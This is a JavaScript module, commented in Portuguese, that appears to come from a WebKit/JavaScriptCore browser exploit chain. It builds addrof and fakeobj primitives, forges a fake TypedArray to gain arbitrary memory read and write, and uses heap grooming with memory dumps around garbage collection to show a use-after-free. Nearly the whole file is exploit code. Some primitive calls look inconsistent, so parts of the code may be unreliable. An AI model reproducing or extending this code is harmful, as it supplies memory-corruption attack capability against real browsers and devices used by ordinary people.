// js/script3/testArrayBufferVictimCrash.mjs (v10 - Final UAF Proof)
// =======================================================================================
// ESTRATÉGIA FINAL:
// 1. Primitiva de L/E robusta com TypedArray mantida.
// 2. CORREÇÃO FINAL: Adicionada a limpeza da referência no `victim_array` após o uso
//    do `addrof`, garantindo que o objeto de sonda seja elegível para o Garbage Collector.
//    Isso deve finalmente revelar o UAF.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            // Silenciado para este teste final
            return defaultValue;
        }
    }
    if (typeof current === 'number') {
        return current;
    }
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let final_result = { success: false, message: "Teste não concluído." };

    try {
        const LOCAL_JSC_OFFSETS = {
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
        };
        
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) { throw new Error("Falha ao obter primitiva OOB."); }

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        logS3("--- FASE 3: Construindo Ferramenta de L/E Robusta com TypedArray ---", "subtest");

        const master_arr_victim = new Uint32Array([0x41414141, 0x42424242]);
        const fake_arr_struct = {
            JSCell_Header: new AdvancedInt64(0x0, 0x01082309),
            Butterfly_Ptr: new AdvancedInt64(0x41414141, 0x41414141),
            Vector_Ptr: new AdvancedInt64(0x42424242, 0x42424242),
            Length_And_Mode: new AdvancedInt64(0x10000, 0x0)
        };

        const master_arr_victim_addr = addrof(victim_array[0] = master_arr_victim);
        const master_arr_victim_structure_addr = fakeobj(master_arr_victim_addr);
        fake_arr_struct.JSCell_Header = master_arr_victim_structure_addr[0];
        const master_arr_victim_butterfly_addr_val = fakeobj(master_arr_victim_addr)[1];
        fake_arr_struct.Butterfly_Ptr = master_arr_victim_butterfly_addr_val;

        const fake_arr_struct_addr = addrof(victim_array[0] = fake_arr_struct);
        victim_array[0] = null; // Limpa a referência do addrof

        const master_arr_controller = fakeobj(fake_arr_struct_addr);
        
        const set_master_arr_addr = (addr_to_point_to) => {
            master_arr_controller[2] = addr_to_point_to;
        };

        const arb_read64_final = (addr) => {
            set_master_arr_addr(addr);
            return new AdvancedInt64(master_arr_victim[0], master_arr_victim[1]);
        };

        const arb_write64_final = (addr, value) => {
            set_master_arr_addr(addr);
            master_arr_victim[0] = value.low();
            master_arr_victim[1] = value.high();
        };
        logS3("Primitivas de Leitura/Escrita via TypedArray estão prontas.", "good");

        logS3("--- FASE 4: Verificando a Nova Primitiva de L/E Robusta ---", "subtest");
        const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
        const spray_obj = { a: 0, b: 0, c: 0, d: 0 };
        const spray_obj_addr = addrof(victim_array[0] = spray_obj);
        victim_array[0] = null; // Limpa a referência
        const prop_a_addr = spray_obj_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        
        arb_write64_final(prop_a_addr, NEW_POLLUTION_VALUE);
        const value_read_for_verification = arb_read64_final(prop_a_addr);

        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("+++++++++++ SUCESSO TOTAL! A nova primitiva de L/E é 100% funcional. ++++++++++++", "vuln");
        } else {
            throw new Error(`A verificação de L/E ROBUSTA falhou.`);
        }

        logS3("--- FASE 5: Depurando o UAF com Ferramentas Estáveis ---", "subtest");
        
        const dump_memory_log_final = async (start_addr, qword_count = 4, label = "") => {
            logS3(`---[ Dump de Memória: ${label} @ ${start_addr.toString(true)} ]---`, "leak");
            for (let i = 0; i < qword_count; i++) {
                const current_addr = start_addr.add(i * 8);
                const value = arb_read64_final(current_addr);
                logS3(`  ${current_addr.toString(true)}: ${value.toString(true)}`, "leak");
            }
            logS3(`---[ Fim do Dump: ${label} ]---`, "leak");
        };
        
        const do_grooming = (grooming_id) => {
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
            let aggressive_feng_shui_objects = new Array(75000);
            for (let i = 0; i < 75000; i++) { aggressive_feng_shui_objects[i] = {a:i}; }
            
            const PROBE_MARKER_VALUE = new AdvancedInt64(0x12345678, 0xABCDABCD);
            const probe_object = { marker: 0, a: 0, b: 0, c: 0 };
            
            // <-- MUDANÇA: Limpando a referência do `victim_array` imediatamente após o uso.
            const probe_object_addr = addrof(victim_array[0] = probe_object);
            victim_array[0] = null; // ESTA É A CORREÇÃO CRÍTICA!

            arb_write64_final(probe_object_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET), PROBE_MARKER_VALUE);
            
            const PROBE_INDEX = 70002; // Deve ser par
            aggressive_feng_shui_objects[PROBE_INDEX] = probe_object;
            
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
                aggressive_feng_shui_objects[i] = null;
            }
            logS3(`  Objeto de sondagem (${probe_object_addr.toString(true)}) marcado para liberação pelo GC.`, "debug");
            
            return probe_object_addr;
        };

        let probe_addr = do_grooming(5);
        let butterfly_addr = probe_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        
        await dump_memory_log_final(butterfly_addr, 4, "SONDA ANTES DO GC");

        logS3("Pausando por 3 segundos para acionar o GC...", "info");
        await PAUSE_S3(3000);

        await dump_memory_log_final(butterfly_addr, 4, "SONDA DEPOIS DO GC");
        
        logS3("Análise de memória da sonda concluída. Verifique o log para a prova final do UAF.", "vuln");

        final_result.success = true;
        final_result.message = "Depuração do UAF concluída com sucesso com primitivas de L/E estáveis.";
        final_result.webkit_leak_details = { success: true, msg: "Prova do UAF deve estar visível no log." };

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
